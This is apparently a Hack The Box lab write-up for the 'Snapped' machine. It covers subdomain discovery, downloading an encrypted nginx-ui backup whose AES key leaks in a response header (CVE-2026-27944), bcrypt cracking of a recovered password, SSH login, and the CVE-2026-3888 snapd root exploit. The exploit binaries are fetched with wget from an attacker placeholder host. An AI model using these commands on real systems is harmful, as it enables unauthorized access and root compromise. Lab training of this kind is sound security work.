# HTB - Snapped - Writeup 

CVE-2026-27944, CVE-2026-3888

```
nmap -sCV 10.129.31.238             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-19 16:58 EDT
Nmap scan report for 10.129.31.238
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 629.58 seconds
```


```
ffuf -u http://10.129.31.238 -H 'Host: FUZZ.snapped.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.31.238
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 60ms]
```

```
echo "10.129.31.238 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts 
```

Exploit:

```
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 \
  | grep -i "X-Backup-Security"
```

```
< X-Backup-Security: uKj0HaGzNcMLUuX1RjAwDst00/OQBJzDcVH7KBwvCIc=:yDXLiT85XG6f+xjc/NBcDA==
```

```
┌──(kali㉿kali)-[~]
└─$ ls -lh backup.zip
-rw-rw-r-- 1 kali kali 18K Jun 19 17:26 backup.zip
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ unzip -l backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      208  2026-06-19 17:26   hash_info.txt
     7696  2026-06-19 17:26   nginx-ui.zip
     9952  2026-06-19 17:26   nginx.zip
---------                     -------
    17856                     3 files
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ mkdir backup
cd backup
unzip ../backup.zip
Archive:  ../backup.zip
  inflating: hash_info.txt           
  inflating: nginx-ui.zip            
  inflating: nginx.zip               
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/backup]
└─$ ls -lah
file *
total 32K
drwxrwxr-x  2 kali kali 4.0K Jun 19 17:28 .
drwx------ 45 kali kali 4.0K Jun 19 17:28 ..
-rw-r--r--  1 kali kali  208 Jun 19 17:26 hash_info.txt
-rw-r--r--  1 kali kali 7.6K Jun 19 17:26 nginx-ui.zip
-rw-r--r--  1 kali kali 9.8K Jun 19 17:26 nginx.zip
hash_info.txt: data
nginx-ui.zip:  data
nginx.zip:     data
```

```
file ../backup.zip
```

```
cat hash_info.txt
```

```
KEY="uKj0HaGzNcMLUuX1RjAwDst00/OQBJzDcVH7KBwvCIc="
IV="yDXLiT85XG6f+xjc/NBcDA=="
```

```
openssl enc -d -aes-256-cbc \
  -K $KEY_HEX -iv $IV_HEX -nopad \
  -in nginx-ui.zip -out nginx-ui-decrypted.zip
```

```
unzip nginx-ui-decrypted.zip
```

```
strings database.db | grep '\$2a\$'
```

```
strings database.db | grep '\$2a\$'
2026-03-19 09:54:01.989628406-04:002026-03-19 09:54:01.989628406-04:00jonathan$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq,
2026-03-19 08:22:54.41011219-04:002026-03-19 08:39:11.562741743-04:00admin$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvmg
```

```
sudo nano hash.txt

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTriVLtEvmg
```

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
linkinpark       (?)     
1g 0:00:00:04 DONE (2026-06-19 17:40) 0.2105g/s 106.1p/s 106.1c/s 106.1C/s smile..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
?:linkinpark

```

```
ssh jonathan@snapped.htb
The authenticity of host 'snapped.htb (10.129.31.238)' can't be established.
ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
jonathan@snapped.htb's password: 
Permission denied, please try again.
jonathan@snapped.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$
```

```
jonathan@snapped:~$ cat user.txt
5d8XXXXXXXXXXXXXXXXXXXXXX314877
jonathan@snapped:~$
```

Privilege Escalation: 

CVE-2026-3888

CVE-2026-3888 is a local privilege escalation in snapd affecting Ubuntu 24.04. It abuses a TOCTOU race condition between two system components:

snap-confine (SUID root) — builds snap sandboxes
systemd-tmpfiles — periodically cleans /tmp/.snap


```
uname -a
cat /etc/os-release
snap version
```

Output:

```
Linux snapped 6.17.0-19-generic #19~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 23:08:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

Kali:

```
git clone https://github.com/DanielTangnes/CVE-2026-3888.git
```

```
cd CVE-2026-3888
ls -lah
```

```
gcc -O2 -static -o firefox_2404 firefox_2404_final.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
```

Transfer to the target machine:

```
python3 -m http.server 8080
```

On target:

```
wget http://<ATTACKER_IP>:8080/firefox_2404 -O ~/exploit
wget http://<ATTACKER_IP>:8080/librootshell.so -O ~/librootshell.so
chmod +x ~/exploit
```

Run: 

```
~/exploit ~/librootshell.so
```
ie:

```
~/exploit ~/librootshell.so
[*] CVE-2026-3888 — firefox 24.04 helper (fixed)
[*] CWD: /home/jonathan
[*] Setting up .snap and .exchange...
```










